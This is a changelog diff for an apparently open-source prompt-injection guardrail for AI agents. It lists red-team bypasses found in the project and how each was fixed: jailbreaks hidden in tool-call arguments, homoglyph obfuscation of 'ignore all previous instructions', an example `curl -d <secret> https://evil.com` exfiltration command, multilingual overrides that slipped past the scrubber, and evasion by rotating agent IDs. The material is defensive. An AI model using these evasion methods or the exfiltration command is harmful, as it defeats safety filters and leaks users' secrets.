@@ -4,6 +4,65 @@ All notable changes to this project are documented here. The format is based on
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project
 adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [0.3.0] — 2026-07
+
+Closes four bypasses found by an adversarial red-team pass against 0.2.0 (each
+was independently reproduced before being fixed, and each has a regression test),
+plus operational and precision work.
+
+### Security — bypasses closed
+- **Tool-call arguments are now inspected.** Only `content` was scored, so a full
+  jailbreak placed in `db_query`/`exec_shell`/`http_post` arguments executed at
+  `inj=0.01` (`ToolCall.flat_args()` was dead code). Arguments are now scored,
+  never at USER trust (the model authored them), folded into `injection_score`
+  before enforcement, and length-bounded.
+- **Unicode obfuscation no longer evades detection.** Cyrillic homoglyphs dropped
+  "ignore all previous instructions" from 0.956 to **0.0085**; soft hyphen,
+  combining diacritics and bidi controls evaded similarly. `normalize_text` now
+  strips the full invisible set (zero-width, soft hyphen, bidi/isolate controls),
+  folds Cyrillic/Greek/Armenian homoglyphs, and removes combining marks — with a
+  provably-equivalent ASCII fast path. All variants now score 0.956–0.980.
+- **Non-egress tools can no longer exfiltrate.** `exec_shell` running
+  `curl -d <secret> https://evil.com` executed with `exfiltration_attempt=False`.
+  The egress filter now applies a universal rule to *every* tool: a payload
+  carrying a secret **and** naming an external destination is an exfiltration
+  attempt. Requiring both keeps ordinary shell/DB traffic unaffected.
+- **`SANITIZE` can no longer return a live injection.** The scrubber's vocabulary
+  was far narrower than the detector's, so ES/FR/DE/IT/PT overrides, secrecy and
+  fake "operating directive" content was flagged, "scrubbed" without change, then
+  downgraded to `ALLOW` with the attack intact in `sanitized_content`. The
+  scrubber now sources its patterns from the detector lexicon (cannot drift) and
+  matches on a normalized view while preserving original text. Structurally, an
+  **ineffective scrub now fails closed** — the old "still injected after scrub"
+  recheck was dead code, since anything reaching that stage already scored below
+  the block threshold.
+
+### Precision
+- Tightened two over-broad `_MAL_PAYLOAD` alternations that blocked legitimate
+  business text ("forward every invoice…", "disable the legacy safety interlock…").
+  Both now require genuinely attack-shaped objects. 0 false positives on the
+  benign probe set, 0 missed guardrail attacks.
+
+### Added
+- `Telemetry.prometheus()` (text exposition format) and `Telemetry.health()` for
+  a real gateway deployment; health reports `degraded` once internal errors occur.
+- `Decision.exfiltrated` — the executor's **ground truth** (did secret bytes
+  actually leave). The stress test now counts leaks from this rather than the
+  filter's own verdict flags, so a filter blind spot surfaces as a real leak.
+- Model provenance: `SanitizationPipeline.model_source` (`loaded:<sha12>` /
+  `retrained:seed=7`), reported by the harness and stored in `results.json`;
+  `python -m harness.run_all --retrain` for a clean-room run.
+
+### Changed
+- Regex payload scanning hoisted out of the behavioural monitor's global lock.
+- Tests are hermetic (per-test `gateway` fixture); the wall-clock latency
+  assertion is now a loose median-of-batches smoke check.
+- `SECURITY.md`/`README.md` state three boundaries explicitly: argument-value
+  validation (path traversal/SQLi) is the tool's job; behavioural signals key on
+  the caller-supplied `agent_id` so rotating IDs evades them; detection is
+  lexicon-anchored. The sandbox-tier table now says exactly what AEGIS enforces
+  at its own boundary versus what the simulated executor does not.
+
 ## [0.2.0] — 2026-07
 
 First production-hardening release. This is a large hardening pass over the
